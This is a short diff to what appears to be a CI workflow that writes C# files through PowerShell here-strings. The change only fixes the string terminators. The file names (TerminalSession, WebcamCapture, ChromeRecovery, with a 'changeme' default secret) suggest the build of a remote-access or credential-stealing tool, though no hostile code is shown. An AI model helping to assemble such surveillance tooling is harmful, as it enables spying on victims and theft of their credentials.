@@ -30,7 +30,7 @@ internal static class BuildConfig
     public const string DefaultSecret = "changeme";
     public const string ExeName       = "CSharpSender";
 }
-@' | Out-File -FilePath "$root/BuildConfig.cs" -Encoding UTF8
+'@ | Out-File -FilePath "$root/BuildConfig.cs" -Encoding UTF8
         }
 
         if (-not (Test-Path "$root/TerminalSession.cs")) {
@@ -76,7 +76,7 @@ namespace CSharpSender
         }
     }
 }
-@' | Out-File -FilePath "$root/TerminalSession.cs" -Encoding UTF8
+'@ | Out-File -FilePath "$root/TerminalSession.cs" -Encoding UTF8
         }
 
         if (-not (Test-Path "$root/WebcamCapture.cs")) {
@@ -131,7 +131,7 @@ namespace CSharpSender
         }
     }
 }
-@' | Out-File -FilePath "$root/WebcamCapture.cs" -Encoding UTF8
+'@ | Out-File -FilePath "$root/WebcamCapture.cs" -Encoding UTF8
         }
 
         if (-not (Test-Path "$root/ChromeRecovery.cs")) {
@@ -159,7 +159,7 @@ namespace CSharpSender
         }
     }
 }
-@' | Out-File -FilePath "$root/ChromeRecovery.cs" -Encoding UTF8
+'@ | Out-File -FilePath "$root/ChromeRecovery.cs" -Encoding UTF8
         }
 
     - name: Read config from BuildConfig
